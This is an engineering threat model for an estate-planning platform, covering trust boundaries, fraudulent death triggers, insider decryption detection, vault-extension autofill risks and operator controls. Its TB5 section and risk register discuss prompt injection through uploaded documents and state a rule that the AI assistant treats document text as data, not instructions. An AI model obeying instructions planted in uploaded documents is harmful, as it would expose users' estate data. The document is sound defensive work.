# Estate Planning Platform — Threat Model

**Version:** 1.0 · Methodology: STRIDE per trust boundary + attacker-goal analysis, mapped to NIST 800-53 control families. This document is a living artifact; every new feature PR that crosses a trust boundary requires a threat-model delta.

---

## 1. What makes this platform's threat profile unusual

Most fintech threat models optimize for "attacker steals money today." This platform has three additional properties that reshape the model:

1. **It is a treasure map.** A single account enumerates every asset a family owns, where it is, what it's worth, who inherits it, and — via the vault — the credentials to reach it. Compromise value per account is far higher than a bank login.
2. **Death is a state transition with privileges attached.** The settlement workflow deliberately transfers access to third parties upon death. Any workflow that grants access on death can be attacked by *faking death* or by *being an insider to a real death* (the grieving-family window is a social-engineering goldmine).
3. **Authorized users are potential adversaries.** Trustees, executors, caregivers, and family members hold legitimate grants and also commit a large share of real-world elder financial abuse. The threat model must treat *granted* access as a monitored surface, not a solved problem.

## 2. Adversaries

| Adversary | Capability | Primary goals |
|---|---|---|
| Nation-state / APT | 0-days, supply chain, long dwell | Bulk PII, HNW-individual targeting, persistence |
| Organized crime | Credential stuffing, SIM swap, phishing kits, ransomware | Vault contents, asset intel for fraud, extortion |
| Malicious insider (platform) | Legitimate infra/DB access | Bulk decryption, audit tampering, targeted snooping |
| Malicious insider (estate) | Legitimate role grants | Over-broad access, premature settlement, distribution fraud |
| Opportunist / abusive family member | Owner's devices, shared knowledge, coercion | Account takeover of elderly users, beneficiary manipulation |
| Curious/negligent third-party pro | Attorney/CPA portal access | Data overexposure, credential mishandling |
| Automated/AI-driven attacker | Scaled spearphishing, voice cloning of "the deceased's lawyer" | Settlement-phase social engineering |

## 3. Trust boundaries

TB1: Internet → Edge (CloudFront/WAF/API GW) · TB2: Edge → Services (authn/z) · TB3: Service ↔ Service (mesh) · TB4: Services → Data stores · TB5: Platform → Third parties (Plaid, LLM providers, death-data providers, notification carriers) · TB6: Client device (Zone A crypto happens here) · TB7: Human operators → Production · TB8: Role-holders → Owner's estate data · TB9: Vault extension ↔ arbitrary web pages (added by M16).

TB9 is genuinely new rather than a subdivision of TB6. TB6 is the client DEVICE, whose adversary is malware or injected script on a surface we serve. TB9's adversary is an arbitrary PAGE the user visits — code we did not write, on an origin we do not control, reached over a channel (an extension that can read and write that page's DOM) which did not exist before M16. The two fail differently: TB6 is defended by the isolated origin, its CSP and its empty dependency tree, none of which apply to a page, while TB9 is defended by origin matching, a gesture requirement and a permission set. See §6j.

## 4. STRIDE highlights per boundary (top findings, not exhaustive)

**TB1/TB2 — Edge & AuthN**
- *Spoofing:* Credential stuffing and SIM-swap-based recovery abuse. → Passkey-first, SMS never sufficient alone, breach-corpus password checks, per-account **and best-effort per-address** rate limits (M17 PR1 — **per-IP is NOT built**: identity has no client IP, neither public edge forwards one, and edge limiting is blocked on the M5 cloud half; see §6k), device binding.
- *DoS:* Shield Advanced + autoscaling + per-tenant load shedding; settlement endpoints get separate quotas so an attack can't mask fraud attempts in noise.
- *Info disclosure:* GraphQL introspection off in prod; persisted queries only; error responses genericized.

**TB4 — Data stores**
- *Tampering:* Audit chain hash-anchored to WORM storage; DB roles cannot UPDATE/DELETE event tables; nightly chain verification with paging on gap.
- *Info disclosure:* Bulk-decryption detection — per-principal decrypt-rate baselines with hard circuit breakers. DETECTION SHIPPED IN M18 (§6q) and its signal is the `crypto.field.decrypted` audit stream, NOT KMS telemetry: every Zone B decrypt emits fail-closed before plaintext is released, while the 5-minute DEK cache means N reads under a hot key are N audit events and ZERO KMS operations — KMS-side monitoring structurally cannot see read volume, in the cloud exactly as locally. Bounds are fixed reviewed constants set from measured ceilings (never a learned baseline an attacker could train, and never the old "normal × 50" formula), and for the one class whose legitimate volume scales with ESTATE SIZE rather than with activity a count is joined by a DISTINCT-SUBJECT condition — both must be exceeded, which suppresses re-reading without moving the threshold at which a mass read of different rows breaches (§6q(ii)). ENFORCEMENT — suspending the KMS grant, paging a security operator — remains cloud-blocked (real IAM, TB7): the grant is still the RESPONSE chokepoint, but it was never the detection signal.
- *Elevation:* IRSA-scoped pod identities; no shared DB users; RLS as a second net under application authz.

**TB5 — Third parties**
- *Plaid token theft:* Access tokens decryptable only inside the sync worker's isolated namespace; tokens are per-item revocable; webhook signatures verified; anomalous sync patterns alert.
- *LLM data leakage:* Privacy proxy tokenizes names/SSNs/account numbers before provider calls; zero-retention contracts; per-feature consent; prompt-injection defense for any AI feature that reads user-uploaded documents (uploaded doc content is untrusted input — the assistant must never treat document text as instructions, and tool scopes for the assistant are read-only).
- *Death-data providers:* Treated as *signals*, never triggers. See §5.1.
- *Supply chain:* Pinned digests, SBOM + SLSA provenance, cosign verification at admission, dependency review gates, vendored critical libs, no postinstall scripts in CI.

**TB6 — Client**
- *Vault key theft via malware/XSS:* Strict CSP, Trusted Types, no third-party scripts on vault surfaces, WebCrypto non-extractable keys where platform allows, memory zeroization best-effort, clipboard auto-clear, re-auth on vault open.
- *Coercion/shoulder-surfing of elderly users:* Optional "trusted-contact review" mode where high-risk changes (new beneficiary + address change + export within 24h) trigger a notification hold.

**TB9 — Vault extension ↔ arbitrary web pages** (M16)
- *Filling the wrong origin (credential exfiltration):* This is the boundary's defining failure, because a filled credential belongs to the page that received it — the isolated world protects the extension's variables, not the DOM value, so the origin decision IS the disclosure decision. → Registrable domain via a vendored, digest-pinned Public Suffix List snapshot (never a substring, never label stripping); scheme binding, so an `https`-saved credential is never offered on `http`; THE FILL TOUCHES THE TOP FRAME AND NOTHING ELSE — which is narrower than this
section originally described, and the narrowing is the result of measuring the platform in Chrome 151 rather than reasoning about it. The old text promised "cross-origin iframes refused by default with a per-item opt-in", and both halves turned out to be wrong. `activeTab` grants exactly the main frame's ORIGIN, host-exact, so a same-site subframe on a different host (`pay.example.com` under `example.com`) is refused by Chrome outright; PR3a's `frameIsAllowed` would have computed "allowed" for a frame the fill could only ever fail on. And the per-item opt-in CANNOT BE BUILT on `activeTab` at all: honouring it needs host permissions for the third-party origin (`optional_host_permissions` plus a runtime `chrome.permissions.request()`), a manifest key and a consent surface this milestone does not have. `frameIsAllowed` IS DELETED rather than kept, because wiring it showed it can have no caller: the popup cannot enumerate frames (that needs `webNavigation` or `tabs`, deliberately not held), and the injected function cannot import it (`func` is serialized). A rule with nowhere to run is the M4 zero-callers shape. What replaces it is stronger than a rule of ours — THE PLATFORM ENFORCES IT, and refuses an injection into any frame the grant does not cover. **Accepted cost, stated rather than hidden:** a login form inside an iframe is not filled, including a same-origin one, because the extension cannot name the frame without a permission it refuses to hold. confusable domains REFUSED rather than warned about. **Confusable detection is PARTIAL as shipped, and NARROWER after the M16 PR5 review than PR3a claimed.** Caught: an ASCII homoglyph skeleton (`rn`/`m`, `vv`/`w`, `cl`/`d`, digit-for-letter) and edit-distance-1. **Punycode is no longer flagged as confusable at all**, and removing it made the control stronger rather than weaker. The old rule returned `confusable` whenever EITHER side carried an `xn--` label, without comparing the two — so it was not a comparison, and on any internationalised page every saved item matched it. Because `matchesFor` keeps confusable verdicts and drops only `no-match`, the measured effect was that ONE VISIT TO ANY IDN PAGE returned the WHOLE VAULT from the key holder — every title and every saved registrable domain — which is exactly the disclosure `matchesFor` exists to prevent. It also fired the lookalike refusal, the one phishing bound this section commits to, on every item at once on ordinary pages. Nothing was given up: filling requires the registrable domains to be EQUAL, so a punycode host that is not the saved domain was already unfillable and the clause only decided the LABEL on the refusal. The general Unicode confusable case (including a genuine punycode homograph) needs UTS #39 skeletons over a vendored confusables table plus punycode decoding, and remains a named follow-up. A miss is a `no-match`, so it is still REFUSED for filling — what is lost is the explanation, never the boundary. What replaces the per-item claim is a single page-level notice when the page's own registrable domain is internationalised.
- *A hostile page inducing a fill:* → The content script is structurally unable to REQUEST a credential — its message union carries no such variant and it cannot import the key holder. A fill is a one-shot injection into a named frame at the moment of a gesture in extension-owned UI, so there is no standing channel a page can address. **THE EXTENSION NEVER SUBMITS, AND THAT IS NOT THE SAME AS "NOTHING IS EVER AUTO-SUBMITTED"** — which is what this sentence used to say, and the M16 review measured the difference. A fill must dispatch `input` and `change` or no field notices the value, and the reasoning that withholds `blur` ("a page is free to submit on blur, so dispatching one would be auto-submission by proxy") is true of those verbatim: a jsdom probe against the real module showed a page's `change` listener holding the real secret. There is no fix, because the events ARE the fill; what M16 PR5 changed is ORDER — the username is written before the password, so a page that commits early can no longer get the secret with the username field still empty, which is what it used to get. The on-screen copy no longer asserts "Nothing was submitted" either; it says what Estate did and points the user at the address. Also narrowed: the fill's origin decision is now re-read AT THE GESTURE. It used to run on a page URL captured when the popup rendered, so the key holder's re-decision — documented as defending against "the page navigating between the two calls" — compared the same stale string twice and could not see a navigation at all; what actually stood in the way was Chromium revoking `activeTab`, which nobody measured and no test asserted.
- *A hostile page reading the vault by breadth of access:* → `activeTab` + `scripting` only, with no declared content scripts, so the extension has no view of any page until the user clicks it — and any later broadening is a required-permission increase the browser surfaces as re-consent.
- *Compromised store update (the boundary's un-detectable case):* An auto-updated signed artifact has no CSP in its path, and a self-check is written by the same artifact. → Blast-radius reduction first (an `extension` session audience admitted per handler, so it cannot destroy the VAULT — narrowed in M16 PR4a, which admitted `createItem` and `updateItem`: `reset`, both keyset routes and all eleven emergency routes stay refused, so the keyset survives and the vault still opens, but an unlocked extension can overwrite every ITEM with bytes that are not ciphertext and each one becomes permanently unreadable. `vault_items_versions` holds the prior image, and SINCE M27 PR1b the product reads it — the owner lists an item's versions and restores one over the API, so recovery is theirs rather than an operator's. The three restore routes are refused to the `extension` audience, so the credential that can perform the overwrite cannot perform the undo; see §6ww. The mitigation and the residual below describe the same moment — an unlocked vault — and this clause used to overclaim against it), permissions pinned as data, reproducible builds, published SLSA provenance, and a third-party-runnable verification procedure. *Residual, accepted and stated:* an update keeping the same permissions exfiltrates everything the user unlocks and the platform cannot detect it.
- *Phishing:* Autofill does not resist it. A credential saved at a lookalike is filled at that lookalike. Passkeys are the structural answer and shipped for the web app in M17 PR5 (§6o; the vault origin and extension remain TOTP-only); the refusal above is the bound M16 owes, and with `activeTab` it fires when the user opens the extension, not when they land on the page.

**TB7 — Operators**

This block was one sentence in the present tense — "No standing prod access; JIT
elevation with peer approval and session recording; all operator reads of user
data are themselves audit events surfaced to the user; separation of duties
between deploy, data, and key administration" — describing a system that has
never had an operator, a production environment, or an operator platform. M21
rewrote it into what is TRUE, what M21 SHIPS, and what is DEFERRED WITH AN
OWNER, because a control asserted in the present tense is what stops the next
person looking. The reason they accumulated invisibly is that TB7 appeared in
no milestone list and had therefore never been sized.

**How many, and how to count them again.** M21's own residual sweep is the
answer: every §6 bullet now carries a leading disposition tag, so the deferrals
owned by this milestone are
`grep -c '^- \*\*\[OWNER: M21\]\*\*' docs/03-threat-model.md` — anchored on the
BULLET, because the unanchored form counts prose mentions of the tag as well and
M40 PR1 added one. **18** across ten subsections at the time of writing; **17**
across nine after M40 PR1 re-tagged §6e's documents oracle to M41; and **ZERO**
since M40 PR2 adjudicated all seventeen (§6fff) — the grep is the count, and it
now answers nothing, which is the outcome the sweep was for. The wider naming is
counted the same way — `grep -cE 'TB7|the operator platform' docs/03-threat-model.md`
— which is **31** lines across seventeen subsections after M40 PR2, against 27
before it. THREE OF THE THIRTY-ONE ARE §6fff'S OWN RECORD OF THIS SWEEP, and the
figure moved from 30/sixteen to 31/seventeen DURING the writing of this paragraph,
when a re-owning note added the phrase to §6y. That is the point rather than a
caveat: this figure has the corpus-counts-its-own-commentary shape M40
PR1 found three times, so it is quoted with the command that derives it instead of
carried as a number. The hand-count it replaces said "a further 15 across eleven"
and had not been re-measured since.

The figure moved four times and never downward WHILE IT WAS BEING MEASURED —
five, twelve, fourteen, eighteen — and each of those moves was somebody actually
looking, which is the argument restated rather than an embarrassment. It has
since moved DOWN twice, and neither time by measuring: M40 PR1 re-tagged one
bullet to M41, and M40 PR2 adjudicated the remaining seventeen to zero. Both are
items LEAVING the category rather than a recount of it, which is why the upward
argument above still holds for every measurement that produced it. This paragraph first said "twelve
separate deferrals across §§6a–6y" and both halves were wrong in the same
direction as the defect the milestone exists to fix: twelve was a hand count
taken before the sweep tagged anything, and §§6a–6y stops short of §6z and
§6aa — M21's own deltas — so a range written down before the sections exist
undercounts by construction.

Fourteen became eighteen because PR2.5 found the SWEEP under-collecting. The
fence's corpus is bullets, and five declared residual regions (§6b twice, §6f,
§6s, §6t) stood over PROSE PARAGRAPHS — recognized markers, opened blocks, zero
bullets collected, every assertion passing over content it never saw. §6b's two
were TB7 deferrals, so the milestone scoped from this count had not counted its
own. `packages/contracts/test/threat-model-residuals.spec.ts` now fails on a
declared region that collects nothing, which is the narrower and worse case than
the bound PR0 stated: not "outside a declared region and unmarked", but INSIDE
one and still invisible. The tag is the count; a number in prose beside a
greppable mark is a second copy free to drift, and this one drifted while the
fence that was supposed to hold it green went green.

*True today, and cheaply so.* There is no standing production access because
there is no production (E1, the cloud half, is blocked on a business decision).
That sentence costs nothing and proves nothing; it is recorded here so it is not
mistaken for a control.

*Separation of duties — PARTIALLY REAL, at the row rather than the role.* The
§5.1 chain enforces reviewer ≠ reporter and, for staged access, requester ≠
approver, both as DDL CHECKs rather than as convention, and distributions carry a
row-local dual-control CHECK (§6b). That is genuine separation of duties over the
DECISION. Separation between deploy, data and key administration is a property of
IAM roles and remains **E1**.

*Operator identity — the interim, and its one real safety property.*
`settlement_operators` is an append+revoke allowlist whose rows are the history,
consulted through `OperatorGate` (M21 PR2 — before it, four separate admission
paths in one service, disagreeing about which database handle to ask on). The property that matters is that **no runtime
session can mint an operator**: there is deliberately no grant API, so a stolen
operator session cannot widen the allowlist. Until M21 PR1 that property lived
only in three docstrings and was checked nowhere, and one of them was wrong about
its own mechanism — `operators.repo.ts` called its write methods "the CLI-only
write path" while the CLI reimplemented both in raw SQL and called neither, so
the repo's write methods had no caller in the repository at all. **M21 PR1 keeps
the property and makes it checkable** (§6z): the CLI drives the repo, a source
fence asserts in both directions that nothing else does, and the ceremony now
audits — `settlement.operator.granted` / `.revoked`, which is the first entry the
append-only trail has ever carried for the act of granting the authority to
approve a death case. It also **refuses to write when it cannot record**, and
demands a `--by` that fills the `granted_by` column M7 declared and nothing had
ever written.

*Operator authentication — **shipped in M21 PR3a** (§6bb), after PR2's
measurement moved it here.* Before it, an operator was an ordinary account
session that happened to appear in a table. The audience was originally scoped
for PR2 and moved, because measuring the machinery showed it cannot do the thing
the ordering assumed. `AllowSessionAudiences` takes
`Exclude<SessionAudience, 'account'>` — the default is unconditionally prepended
and cannot even be named — and `CallerGuard.audiencesFor` returns
`[...new Set([...serviceWide, ...perRoute])]`, a union that widens and can never
narrow. So decorating a settlement route would admit `['account', 'operator']`:
every ordinary session, exactly as today. WHAT AN AUDIENCE BUYS IS SUBTRACTIVE —
a session carrying it is refused by every service that has not opted in, which is
what `vault` and `extension` buy — and that value is unrealized until an operator
has a surface giving them a reason to hold one. PR3a is therefore the boundary
and PR3b the surface: `AUDIENCE_ADMITTERS.operator` is EMPTY, three identity
routes are widened per handler (`session`, `stepUp`, `logout`), and settlement is
deliberately not among them, so today a redeemed operator session is refused by
every service in the product including the one whose queue it exists to reach.
It also needed a mint path that did not exist: `auth_handoffs` carried
`CHECK (audience IN ('vault'))` — a list with exactly one member, not an equality
— and migration `012_operator_audience.sql` widens that list rather than
replacing the shape. The form matters as much as the value:
`packages/auth-guard/test/session-audience.spec.ts` parses the `IN (…)` shape and
REFUSES any audience CHECK it cannot read, so rewriting this constraint as
`audience = 'vault'` would mean the same thing to Postgres and blind the fence
that guards the whole vocabulary. An earlier version of this paragraph quoted the
equality form, which is precisely the "correction" that would do it. THE MINT IS
ROLE-BLIND and that is not a gap: identity holds no settlement credential and
there is no dblink between the auth and core clusters, so it cannot ask who is an
operator, and a session is a RESTRICTION rather than a claim about its holder.
`OperatorGate` stays the control in every case.

*Operator actions are audited but NOT rate-limited* — **M23**, which is where
§6bb already places it. This line said **M21 PR3b** until PR4's review: PR3b
shipped the surface and no bound, so one item carried two owners and the earlier
one was a merged PR. A deferral pointing at something already delivered is how
an item stops being counted, which is the failure M21 exists to answer.

*Operator reads of user data are audit events — for ONE operator read, and not
for the ones an operator console would make; and none of them is "surfaced to the
user".* CORRECTED IN M21 PR3a, because the earlier version of this sentence was
wrong in both halves and it was wrong in the direction that stops somebody
looking. Measured: `AUDIT_ACTIONS` carries 23 `settlement.*` actions and EVERY
ONE OF THEM IS A WRITE — settlement emits no read event of any kind, so the queue
an operator works from, the case they open and the timeline they read leave no
trace that they were read. Documents emits exactly one operator read,
`document.evidence.accessed` (whose actor class disagreed with its own paired
decrypt event until M21 PR2.5). And `estate.viewed` is `asset.estate.viewed`, an
ASSETS event describing an EXECUTOR's inventory read (§6r) — a different actor
class entirely, cited in a paragraph about operators. **CLOSED for settlement by
M21 PR3b** (§6cc): `settlement.queue.viewed` and `settlement.case.viewed` ship
with the console screens that make the reads, on the rule that a control ships
with its caller — correcting the prose first, rather than adding a routeless
event, was the M18 PR1 precedent. The paragraph's opening sentence describes what
was true before that change and is kept as the record of it. **Owner:
M30** (in-app feed) for showing a user that support accessed their data on a
date, which no mechanism anywhere does. The "Anthropic-style transparency"
phrasing is kept as the goal and no longer stated as a fact.

*Deferred, each with an owner, NOT shipping in M21's minimum slice:* JIT
elevation (**E1** — it needs real IAM); peer approval of an operator action, as
distinct from the reviewer ≠ reporter CHECK that already exists (**M46**; this
said **M21 follow-on, not the minimum slice**, which named an owner that was not
a milestone — no queue row, no `OWNERS` entry, nothing to schedule — and it
survived because this block is PROSE, outside the §6 bullet corpus the residuals
fence reads, the blind spot §6uu records. M40 PR2 made that owner a row); session recording (**E1**); KMS grant suspension and
paging on a decrypt-rate anomaly, which is the RESPONSE half of TB4's insider
control whose DETECTION shipped in M18 (**E1**); a human-facing surface for that
M18 alarm, whose reader is an operator who NOW exists (**M23**; this said **M21
PR3b**, which shipped the console without it — the same rot, one paragraph
over, and the reason PR4 swept every TB7 owner rather than the one it tripped
on);
operator-assisted account recovery, which §§6h/6m/6o each name as the remedy that
does not exist (**M46**; the second item this block owned to a non-milestone,
re-owned by M40 PR2 in the same change); and the legal-hold lift ceremony, which M9 PR2
shipped noting that a hold outlives case close with no way to release it
(**M21 PR5**; this said **M21 PR4**, and docs/04 re-sequenced that slot to the
security review on 2026-08-19 without updating this sentence — the SAME rot as
the M21 PR3b correction one clause above, in the same paragraph, caught by M40
PR0 while deciding whether M21 had finished. It has not: PR5 is its one
outstanding PR).

## 5. Platform-specific attack scenarios (the ones generic checklists miss)

### 5.1 Fraudulent death trigger ("kill them on paper")
**Attack:** Adversary (often a would-be heir or an account-takeover attacker who wants executor-level access) reports the owner dead with a forged certificate or exploits a false-positive from a death-data provider.
**Controls:** (1) No automated trigger from any single source — provider matches only open a *case*. (2) Mandatory human review of certified evidence. (3) Waiting period (default 5 days, configurable up) during which the platform aggressively attempts owner contact through every channel including hardware-key challenge; any owner sign-in with step-up MFA instantly voids the case and flags the reporter. (4) Account enters `deceased_pending` — reads freeze for role-holders and do not thaw. This is a control on grants the owner made *while living*, and a death report is the reason they stop. It is not the control that governs the EXECUTOR, whose authority arrives only on verification and is governed by (5); reading control 4 as covering them left an executor unable to see the estate's contacts at any point, ever. (5) Executor access post-verification is *staged*: inventory first, vault emergency-access last, each stage separately approved — and the estate's CONTACTS are one of the things it stages, released with the documents rung, because who the decedent named is disclosure about living third parties rather than about the estate's holdings. (6) The reporter's identity is verified and recorded; fraudulent reports are preserved for law enforcement.

### 5.2 Emergency-access abuse
**Attack:** A designated emergency contact invokes vault access while the owner is alive but unaware (hospitalized, traveling, cognitively declining).
**Controls:** Waiting period ≥ 24h (owner-configurable), multi-channel owner notification with one-tap deny, optional M-of-N Shamir requirement so no single contact can unlock alone, full audit visible to owner afterward, and scope limits (contacts can be granted vault subsets, not all-or-nothing).

### 5.3 Insider bulk decryption
**Attack:** Platform engineer or compromised service identity attempts mass read of SSNs/documents.
**Controls:** Every released plaintext is one fail-closed `crypto.field.decrypted` event, and the M18 detector (§4 TB4, §6q) alarms on per-principal windowed counts over reviewed bounds — the DEK cache means bulk READS are not bulk KMS operations, so the audit stream, not KMS, is what sees them. Per-user DEKs still mean bulk access across many users requires bulk KMS unwraps (rate-limited and circuit-broken at the grant — the enforcement half, cloud-blocked); CloudHSM roots mean even AWS-level compromise can't silently exfiltrate key material; canary records (fake users with tripwire fields) page on any access.

### 5.4 Grief-window social engineering
**Attack:** After a real death, attackers phish executors/beneficiaries ("probate portal fee required"), possibly with AI voice cloning of the family attorney.
**Controls:** All settlement communication happens in-app only; emails/SMS are content-free pointers by design, and onboarding for role-holders drills this ("we will never link you to a payment page"); executor dashboard shows verified contact cards for the estate's attorney/CPA; distribution approvals are dual-control with step-up MFA.

### 5.5 Beneficiary-conflict information abuse
**Attack:** A beneficiary with read access enumerates other beneficiaries' shares to contest or coerce.
**Controls:** ABAC default — beneficiaries see only assets naming them and only their own designation, unless the owner explicitly opens visibility; access-pattern anomalies (rapid enumeration) alert the owner.
**As built:** the ABAC default is real and enforced for CONTACTS (`effectiveContactReadGrants` → the Cedar PEP). "Unless the owner explicitly opens visibility" is intent, not a shipped control: no mechanism shares an asset or a document with a role-holder, and the platform now refuses to record a grant claiming otherwise (§6s). Rapid-enumeration alerting is §6q's decrypt-rate detector, which raises to the audit chain and a log line — there is no owner notification (§6q).

### 5.6 Ransomware / destructive attack
**Attack:** Encrypt-and-extort against databases and object storage.
**Controls:** Immutable, cross-account, Vault-Locked backups the prod account cannot delete; monthly automated restore verification; event-sourced domains can rebuild projections; ransomware-specific runbook with decision tree and pre-negotiated IR retainer; audit chain proves data integrity post-recovery.

## 6. Risk register (top 10)

| # | Risk | L | I | Residual treatment |
|---|---|---|---|---|
| 1 | Account takeover of elderly / low-security users | H | H | Passkey nudges, trusted-contact review mode, adaptive step-up |
| 2 | Fraudulent settlement trigger | M | Critical | §5.1 layered controls; annual red-team of the flow |
| 3 | Insider bulk data access | M | Critical | KMS chokepoint + detection; JIT access; canaries |
| 4 | Vault client-side compromise (XSS/malware) | M | Critical | CSP/Trusted Types; isolated vault origin; bug bounty focus area |
| 5 | Plaid/aggregation token abuse | M | H | Namespace isolation, revocation drills |
| 6 | LLM prompt injection via uploaded docs | H | M | Untrusted-input framing, read-only tools, output filtering |
| 7 | Supply-chain compromise of a dependency | M | H | SLSA, pinning, admission control, egress allowlists |
| 8 | Legal/compliance failure in a state template | M | H | Attorney-gated template releases; per-state execution-requirement engine |
| 9 | Ransomware | M | H | §5.6; RTO 15m / tested restores |
| 10 | Notification-channel phishing of role-holders | H | M | Content-free notifications, in-app-only sensitive comms |

## 6a. Threat-model delta — M6 vault, Zone A (2026-07-27)

This document requires a delta for every feature PR that crosses a trust
boundary. M6 activates **TB6 (client device)** in earnest: until now no code
held keys the server could not derive, and risk #4 (vault client-side
compromise, Critical) described something that did not exist yet.

**Controls now shipped.**
- Keys derive from the vault password AND a 128-bit device-only Secret Key
  (2SKD), so the server-held verifier and wrapped master key are useless to an
  attacker who has the database and a correct password guess. This is the
  control that makes §5.3 (insider bulk decryption) structurally inapplicable to
  Zone A: there is no bulk decryption path, because there is no decryption path.
- The vault password never transits (SRP-6a). Every unlock failure emits
  `vault.open.failed`, which is what makes §4/TB4-style burst detection possible
  for vault access specifically.
- Master and item keys are unwrapped as **non-extractable `CryptoKey`s**, the
  TB6 "non-extractable keys where the platform allows" control — an injected
  script in the vault origin can use them but not read them out.
- `@estate/vault-crypto` has zero runtime dependencies, enforced by lint and by
  a source-scanning test. This is the TB6 supply-chain control: the code holding
  the only keys that open a vault has no transitive tree to compromise.
- The client pins the KDF and SRP parameters the server serves it, so a
  malicious server cannot downgrade the group or the iteration count.
- Step-up MFA gates vault open and all key-material changes, per §5 of the
  architecture doc.

**Residuals accepted, and why.**
- **[ACCEPTED]** *JS `bigint` is not constant-time.* True of every JavaScript SRP; bounded by
  network jitter, and no code path branches early on a secret comparison.
- **[OWNER: M39]** *Full-history rollback.* A server that serves an old blob AND claims its old
  version is detectable only by client-side last-seen state. Same class as every
  hosted zero-knowledge store. Per-version AAD binding stops the easier attack:
  replaying a blob at a *different* version fails to decrypt. RE-OWNED FROM M27 BY
  M27 PR0: it is adjacent to the restore work — both read `blob_version` history —
  but closing it needs persistent last-seen state on the vault origin, which is a
  client-storage design M27 does not otherwise touch.
- **[ACCEPTED]** *Reset is token-gated.* A forgotten password cannot be proven, so the reset
  route is the one place step-up-fresh stolen tokens can destroy — never read —
  a vault. Compensating: distinct audit action, step-up freshness, and owner
  notification. RE-CLASSIFIED FROM `[OWNER: M27]` BY M27 PR0: every compensating
  control this bullet names has since shipped — the notification port landed in M9
  and `VaultService.reset` sends on it — and the residual that remains is the
  permanent one, that knowledge of a lost password cannot be proven. There is no
  work owed, which is what `[ACCEPTED]` means; carrying an owner said otherwise.
- **[OWNER: M39]** *No rate limiting on failed SRP proofs yet.* PARTIALLY closed twice over and
  the remainder is named precisely. M16 capped step-up, which bounds both SRP
  legs transitively because both are step-up gated (§6j); M17 PR1 delivered the
  login bound this bullet was tracked against (§6k). What is still open is
  neither of those: a caller holding a GENUINE step-up can burn handshakes, and
  no bound on the SRP route itself exists. Handshakes burn on attempt in the
  meantime. RE-OWNED FROM M27 BY M27 PR0, together with its two continuation tags
  in §6j and §6k — three tags, ONE residual, which is why counting tags overstated
  M27's inherited scope by two.

**§5.2 emergency-access controls, now shipped (M6 PR2).**
- *Waiting period ≥24h, owner-configurable:* enforced by the platform half of a
  two-level split (`RK = platform_part XOR contacts_part`). Colluding grantees
  hold only the contacts half, which is information-theoretically useless alone,
  so the delay is a cryptographic constraint rather than an honour system.
- *Multi-channel owner notification with one-tap deny:* the notification port
  ships with a stub, and the emergency-access routes **refuse in production**
  while only the stub is wired — a waiting period nobody can be told about is
  not a control. Denial is deliberately the one owner action with no step-up
  requirement, because it must be one tap from a notification.
- *Optional M-of-N:* implemented over GF(2^8), threshold 1 by default.
- *Full audit visible to the owner afterward:* every transition is recorded,
  including refused requests, so a grantee who tried repeatedly is visible.
- *Denial is sticky*, with no time-based cooldown — a cooldown would tell a
  patient grantee how long to wait, and outlasting the owner is the attack.
- *Key substitution* (not in §5.2's list, but the same threat class): shares are
  sealed to a public key the owner confirms out of band by fingerprint, and the
  key each share was sealed to is recorded so a later change is detectable.

**Residual accepted here:** the platform half lives on the server, so a server
that releases it early defeats the waiting period. Inherent to docs/01's design
— a delay enforced by a party is only as good as that party. The split still
guarantees that a database dump alone is insufficient, and that no contact can
act alone.

**Not yet shipped, and therefore not yet mitigated.**
- §5.2's *scope limits* (granting a contact a vault subset) remain deferred;
  per-item keys are in place so it is a later grant feature, not a
  re-architecture.
- §5.1 control 5 — settlement's staged access, with vault emergency access last
  and separately approved — is an **M7 integration point**. The release path
  must consult settlement state once settlement exists.
- The isolated vault origin, CSP, and Trusted Types are frontend controls; no
  vault UI ships in M6, so they land with that surface.

## 6b. Threat-model delta — M7 settlement PR1 (2026-07-27)

M7 activates **TB8 (role-holders → owner's estate data)** in earnest: it is the
first flow where the acting principal is routinely NOT the resource owner, and
the first that deliberately changes another user's account state. §5.1 is the
control specification; this delta records how each control landed.

**Controls now shipped (PR1: intake → review → waiting period → verified).**
- *No automated trigger from any single source (control 1).* Intake only OPENS
  a case. Reporters must already be named by the decedent's contact repository
  (`contacts.linked_user_id`) — no lookup by email or arbitrary id exists, so
  intake cannot enumerate accounts. Death-data provider matches are
  operator-filed signals (`data_provider`), never triggers. One open case per
  decedent (partial unique index).
- *Mandatory human review (control 2).* Operators are ordinary platform users
  on a CLI-managed allowlist (`settlement_operators`; deliberately NO runtime
  grant API — a stolen operator session cannot mint operators). Review
  decisions are step-up-gated; reviewer ≠ reporter is a DDL CHECK plus a row
  check; "no privileged status without recorded review" is a DDL CHECK. The
  reviewing operator can read death-certificate evidence through a dedicated
  documents route whose authority is settlement's answer, cross-checked
  against the document's REAL owner — a reporter registering someone else's
  document id as evidence gets an operator a uniform 404, not a decryption.
- *Waiting period with aggressive owner contact (control 3).* Default 5 days,
  owner-configurable UP to 60 (floor in DDL + schema + service; changes
  refused while a case is open — a pending case's parameters are frozen).
  Escalating contact attempts on a 12h multi-channel schedule, recorded
  append-only. The in-process driver that performs them holds NO transition
  power: timer expiry only makes a case ELIGIBLE; an operator (again never the
  reporter) explicitly confirms, and the confirmation re-checks owner liveness
  against identity's append-only step-up ledger — a step-up newer than the
  case voids it on the spot, restores the account, and flags the reporter.
  That check is enforced TWICE, deliberately: settlement reads liveness before
  asking for the terminal transition, and identity restates the predicate in
  the same single statement as the status write (a `NOT EXISTS` over
  `auth_events` in the CAS `UPDATE`, same cluster, no network hop). Without
  the second one, a step-up landing between settlement's read and its commit
  would be invisible, and — since there is no un-verify ceremony — would
  entomb a living owner in `settlement` irreversibly. The interlock turns that
  race into a refusal (`409 owner_alive`) that voids the case instead.
  The owner's own kill switch is a step-up-gated void route (the step-up IS
  the liveness proof; a bare stolen bearer cannot void).
- *Account enters deceased_pending (control 4).* Cross-service, identity-
  enforced: a closed transition table (active↔deceased_pending→settlement)
  behind a dedicated service credential; identity applies its own invariants
  regardless of what settlement asks. The lock call happens INSIDE the case
  transaction — an unconfirmable lock rolls the transition back. During
  deceased_pending the OWNER's login and sessions stay alive (the rescue
  path) while profile's role-holder contact grants freeze.

  NARROWED BY M23 PR4a, because the sentence above described a control the
  code did not implement. `RolesRepo.effectiveContactReadGrants` carried a
  predicate excluding every owner with a case in `waiting_period`, `verified`,
  `active` OR `distributing` — so the freeze began at the waiting period, as
  written, and then NEVER LIFTED. Combined with the same query's
  `effective_condition = 'immediate'`, which an executor's `on_death_verified`
  designation never satisfies, an executor could not read the estate's contacts
  at any point, ever. Control 4 was silently answering a question that belongs
  to control 5, and answering it "no" forever.

